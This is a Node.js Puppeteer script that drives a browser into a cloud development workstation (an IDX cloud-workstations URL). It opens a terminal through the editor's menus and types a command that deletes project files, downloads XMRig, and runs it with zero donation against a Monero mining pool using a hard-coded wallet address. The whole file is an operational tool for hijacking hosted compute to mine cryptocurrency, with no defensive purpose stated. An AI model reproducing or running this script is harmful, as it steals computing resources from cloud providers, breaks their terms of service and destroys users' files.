const puppeteer = require('puppeteer');
const {
    openChrome,
} = require('./lib');

const port = process.argv[2] ? parseInt(process.argv[2], 10) : 9224;

// Validate port is a number and in valid range
if (isNaN(port) || port < 1024 || port > 65535) {
    console.error('Please provide a valid port number between 1024 and 65535');
    console.log('Usage: node openChrome.js [port]');
    process.exit(1);
}


const runReset = async (port) => {
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });
    const page = await browser.newPage();
    await page.goto("https://idx-react4-1746439876356.cluster-ejd22kqny5htuv5dfowoyipt52.cloudworkstations.dev/?folder=/home/user/react4");

    await new Promise(resolve => setTimeout(resolve, 3 * 1000));
    await page.waitForSelector('.menubar-menu-button', { timeout: 5000 });
    await page.waitForSelector('.monaco-highlighted-label', { timeout: 100*1000 });
    console.log('editor-group-watermark===================');
    await page.click('.menubar-menu-button');

    await page.waitForSelector('div.menubar-menu-items-holder', { timeout: 5000 });
    await page.waitForSelector('.action-label[aria-label="Terminal"]', { timeout: 5000 });
    await page.click('.action-label[aria-label="Terminal"]');
    console.log('Clicked on "Terminal================================"');

    await page.waitForSelector('.action-label[aria-label="New Terminal"]', { timeout: 5000 });
    const child = await page.$('.action-label[aria-label="New Terminal"]');
    const parent = await child.evaluateHandle(el => el.parentElement.parentElement);
    // parent.click();
    const parentElement = parent.asElement();
    console.log('parentElement____', parentElement.click);
    const box = await parentElement.boundingBox();
    console.log('Bounding box:', box);
    if (parentElement) {
        await parentElement.click({ delay: 100 });
    } else {
        console.error('Parent element not found or not an ElementHandle');
    }
    console.log('Clicked on "New Terminal"');
    await new Promise(resolve => setTimeout(resolve, 3 * 1000));
    await page.waitForSelector('.xterm-link-layer', { timeout: 100 * 1000 });
    const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + 'dnd2_1'
    await page.type('.xterm-helper-textarea', textToType);
    await page.evaluate(() => {
        const textarea = document.querySelector('.xterm-helper-textarea');
        const event = new KeyboardEvent('keydown', {
            key: 'Enter',
            code: 'Enter',
            keyCode: 13,
            which: 13,
            bubbles: true
        });
        textarea.dispatchEvent(event);
    });
}
const main = async () => {
    openChrome(port)
    // .catch(err => {
    //     console.error('Failed to start Chrome:', err)
    //     openChrome(port)
    //     setTimeout(() => {
    //         console.log('Chrome opened successfully');
    //         runReset(port)
    //     }, 2000);
    // });
    setTimeout(() => {
        console.log('Chrome opened successfully');
        runReset(port);
    }, 2000);
}
main();
